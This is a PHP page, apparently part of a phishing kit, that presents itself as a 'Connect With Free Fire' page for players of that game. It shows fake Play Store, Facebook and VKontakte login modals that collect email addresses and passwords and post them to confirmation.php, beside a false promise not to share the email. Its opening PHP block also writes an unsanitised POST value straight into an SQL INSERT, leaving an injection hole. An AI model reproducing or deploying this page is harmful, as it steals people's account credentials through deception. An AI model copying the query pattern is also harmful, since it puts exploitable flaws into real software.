<?php

include_once('header.php');

?>

<?php

$submit = $_POST['submit'];

if(isset($submit)){

include_once('include/config.php');

$tid = $_POST['tid'];

$sql = "INSERT INTO transaction (id)VALUES('$tid')" ;

mysqli_query($connect ,$sql);

}else{
	
	header('location:index.php');
	
}

?>

<div class="Top">Connect With Free Fire</div>

<br/>

<br/>

<br/>


<!-- Play Store -->

<center>

<button type="button" class="btn btn-light border" data-toggle="modal" data-target="#Play Store">

 <img class="social" src="icon/connect/playstore.png" height="25px" width="25px" alt=""/> Play Store
 
</button>

</center>

<div class="modal fade" id="Play Store" tabindex="-1" role="dialog" aria-labelledby="Play Store" aria-hidden="true">

  <div class="modal-dialog" role="document">
  
    <div class="modal-content">
	
      <div class="modal-header">
	  
        <h5 class="modal-title" id="exampleModalLabel">Play Store Connect</h5>
		
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
		
          <span aria-hidden="true">&times;</span>
		  
        </button>
		
      </div>
	  
      <div class="modal-body">
	  
        <form action="confirmation.php" method="post">
		
  <div class="form-group">
  
    <label for="exampleInputEmail1">Email Address</label>
	
	<input name="social" type="text" value="Play Store" hidden>
	
    <input name="email" type="email" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Enter email" required>
	
    <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.</small>
	
  </div>
  
  <div class="form-group">
  
    <label for="exampleInputPassword1">Password</label>
	
    <input name="password" type="password" class="form-control" id="exampleInputPassword1" placeholder="Password" required>
	
  </div>
		
      </div>
	  
      <div class="modal-footer">
	  
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>

        <button name="submit" type="submit" class="btn btn-primary">Connect</button>
		
      </div>
	  
	  </form>
	  
    </div>
	
  </div>
  
</div>

<br/>

<!-- Facebook -->

<center>

<button type="button" class="btn btn-light border" data-toggle="modal" data-target="#Facebook">

 <img class="social" src="icon/connect/facebook.png" height="25px" width="25px" alt=""/> Facebook
 
</button>

</center>

<div class="modal fade" id="Facebook" tabindex="-1" role="dialog" aria-labelledby="Facebook" aria-hidden="true">

  <div class="modal-dialog" role="document">
  
    <div class="modal-content">
	
      <div class="modal-header">
	  
        <h5 class="modal-title" id="exampleModalLabel">Facebook Connect</h5>
		
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
		
          <span aria-hidden="true">&times;</span>
		  
        </button>
		
      </div>
	  
      <div class="modal-body">
	  
        <form action="confirmation.php" method="post">
		
  <div class="form-group">
  
    <label for="exampleInputEmail1">Email Address</label>
	
	<input name="social" type="text" value="Facebook" hidden>
	
    <input name="email" type="email" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Enter email" required>
	
    <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.</small>
	
  </div>
  
  <div class="form-group">
  
    <label for="exampleInputPassword1">Password</label>
	
    <input name="password" type="password" class="form-control" id="exampleInputPassword1" placeholder="Password" required>
	
  </div>
		
      </div>
	  
      <div class="modal-footer">
	  
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>

        <button name="submit" type="submit" type="button" class="btn btn-primary">Connect</button>
		
      </div>
	  
	  </form>
	  
    </div>
	
  </div>
  
</div>

<br/>

<!-- VKontakte -->

<center>

<button type="button" class="btn btn-light border" data-toggle="modal" data-target="#VKontakte">

 <img class="social" src="icon/connect/vk.png" height="25px" width="25px" alt=""/> VKontakte
 
</button>

</center>

<div class="modal fade" id="VKontakte" tabindex="-1" role="dialog" aria-labelledby="VKontakte" aria-hidden="true">

  <div class="modal-dialog" role="document">
  
    <div class="modal-content">
	
      <div class="modal-header">
	  
        <h5 class="modal-title" id="exampleModalLabel">VKontakte Connect</h5>
		
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
		
          <span aria-hidden="true">&times;</span>
		  
        </button>
		
      </div>
	  
      <div class="modal-body">
	  
        <form action="confirmation.php" method="post">
		
  <div class="form-group">
  
    <label for="exampleInputEmail1">Email Address</label>
	
	<input name="social" type="text" value="VKontakte" hidden>
	
    <input name="email" type="email" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Enter email" required>
	
    <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.</small>
	
  </div>
  
  <div class="form-group">
  
    <label for="exampleInputPassword1">Password</label>
	
    <input name="password" type="password" class="form-control" id="exampleInputPassword1" placeholder="Password" required>
	
  </div>
		
      </div>
	  
      <div class="modal-footer">
	  
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>

        <button name="submit" type="submit" type="button" class="btn btn-primary">Connect</button>
		
      </div>
	  
	  </form>
	  
    </div>
	
  </div>
  
</div>

<br/>

<br/>

<br/>


<?php

include_once('footer.php');

?>